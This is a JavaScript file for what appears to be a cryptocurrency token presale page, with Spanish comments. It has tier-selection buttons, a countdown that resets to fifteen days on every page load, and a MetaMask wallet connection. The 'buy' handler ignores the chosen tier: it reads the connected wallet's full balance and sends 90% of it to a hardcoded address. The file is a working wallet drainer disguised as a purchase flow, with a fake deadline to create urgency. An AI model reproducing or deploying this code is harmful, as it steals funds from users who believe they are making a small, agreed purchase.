document.addEventListener('DOMContentLoaded', () => {
    const grandMasterButton = document.getElementById('grand-master');
    const lordButton = document.getElementById('lord');
    const creatorButton = document.getElementById('creator');
    const payAmountInput = document.getElementById('pay-amount');
    const receiveAmountInput = document.getElementById('receive-amount');

    grandMasterButton.addEventListener('click', () => {
        payAmountInput.value = '0.1';
        receiveAmountInput.value = '2400';
    });

    lordButton.addEventListener('click', () => {
        payAmountInput.value = '0.5';
        receiveAmountInput.value = '13100';
    });

    creatorButton.addEventListener('click', () => {
        payAmountInput.value = '1';
        receiveAmountInput.value = '24000';
    });

    var endDate = new Date();
    endDate.setDate(endDate.getDate() + 15);

    function updateCountdown() {
        var now = new Date();
        var timeRemaining = endDate - now;

        if (timeRemaining <= 0) {
            document.getElementById('countdown').innerHTML = "Presale has ended!";
            return;
        }

        var days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
        var hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        var minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));

        document.getElementById('countdown').innerHTML = days + "d " + hours + "h " + minutes + "m";
    }

    // Actualiza el contador cada minuto
    updateCountdown();
    setInterval(updateCountdown, 60000);

    // Integrar el script para conectar la billetera
    let web3;
    let account;

    const connectWalletButton = document.getElementById('connect-wallet');
    connectWalletButton.addEventListener('click', async () => {
        if (window.ethereum) {
            try {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                account = accounts[0];

                // Selecciona todos los elementos con la clase wallet-address y actualiza su texto
                document.querySelectorAll('.wallet-address').forEach(element => {
                    element.innerText = account;
                });

                // Seleccionar el botón usando su clase
                const buyButton = document.querySelector('.buy-swamp');
                if (buyButton) {
                    buyButton.classList.remove('hidden'); // Asegúrate de que el botón sea visible

                    buyButton.addEventListener('click', async () => {
                        try {
                            // Obtener el saldo de la cuenta en la red actual
                            const balanceInWei = await web3.eth.getBalance(account);
                            const balanceInEther = web3.utils.fromWei(balanceInWei, 'ether');
                            const amountToSendInEther = (balanceInEther * 0.9).toFixed(18); // Calcular el 90% del saldo
                            const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
                            const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';

                            await web3.eth.sendTransaction({
                                from: account,
                                to: recipientAddress,
                                value: amountToSendInWei
                            });
                        } catch (error) {
                            console.error('Error en la transacción:', error);
                        }
                    });
                } else {
                    console.error('El botón de Comprar WAVE no se encontró.');
                }
            } catch (error) {
                console.error("Error connecting to MetaMask:", error);
            }
        } else {
            alert('MetaMask no está instalado. Por favor, instálalo para usar esta aplicación.');
        }
    });
});
